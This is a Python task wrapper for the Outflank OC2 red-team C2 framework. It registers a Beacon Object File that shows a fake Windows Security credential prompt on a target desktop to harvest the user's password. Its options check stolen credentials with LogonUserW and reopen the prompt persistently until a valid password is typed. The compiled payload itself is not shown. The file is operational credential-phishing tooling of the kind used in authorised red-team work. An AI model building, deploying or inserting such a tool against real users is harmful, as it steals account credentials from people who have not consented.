import os

from typing import List, Tuple
from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFType, BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


def _resolve_binary_path():
    # `make` copies the PE beside this script as fake-windows-popup-async.x64.o,
    # the name OC2 looks up for an x64 BOF
    return os.path.dirname(os.path.abspath(__file__))


class FakeWindowsPopupAsyncBOF(BaseBOFTask):
    def __init__(self):
        BaseBOFTask.__init__(
            self,
            "fake-windows-popup-async",
            base_binary_name="fake-windows-popup-async",
            base_binary_path=_resolve_binary_path(),
            bof_type=BOFType.ASYNC,
        )
        self.parser.description = (
            "Show the Windows credential prompt over a dimmed desktop as an async job. "
            "Stop the job to close the prompt."
        )
        self.parser.add_argument("--caption", default="", help="Dialog caption (default: Windows Security)")
        self.parser.add_argument("--message", default="", help="Dialog message (default: generated from the logon target)")
        self.parser.add_argument("--timeout", type=int, default=0, help="Timeout in seconds, minimum 10. 0 waits until capture, cancel or job stop (default 0)")
        self.parser.add_argument("--attempts", type=int, default=1, help="Submissions to accept, 1 to 3 (default 1)")
        self.parser.add_argument("--validate", action="store_true", help="Validate the credential with LogonUserW")
        self.parser.add_argument("--persistent", action="store_true", help="Reopen the prompt after Cancel or an empty password")
        self.parser.add_argument("--force", action="store_true", help="With --persistent --validate: reopen after failed validation until a valid password is entered")

    def _encode_arguments_bof(self, arguments: List[str]) -> List[Tuple[BOFArgumentEncoding, str]]:
        parsed = self.parser.parse_args(arguments)
        if parsed.timeout < 0:
            raise TaskInvalidArgumentsException("timeout must be 0 (no timeout) or a positive number of seconds")
        if not 1 <= parsed.attempts <= 3:
            raise TaskInvalidArgumentsException("attempts must be between 1 and 3")

        # Packed layout ZZiiiii, matching BEACON_MAIN in main.cpp
        return [
            (BOFArgumentEncoding.WSTR, parsed.caption),
            (BOFArgumentEncoding.WSTR, parsed.message),
            (BOFArgumentEncoding.INT, parsed.timeout),
            (BOFArgumentEncoding.INT, parsed.attempts),
            (BOFArgumentEncoding.INT, int(parsed.validate)),
            (BOFArgumentEncoding.INT, int(parsed.persistent)),
            (BOFArgumentEncoding.INT, int(parsed.force)),
        ]
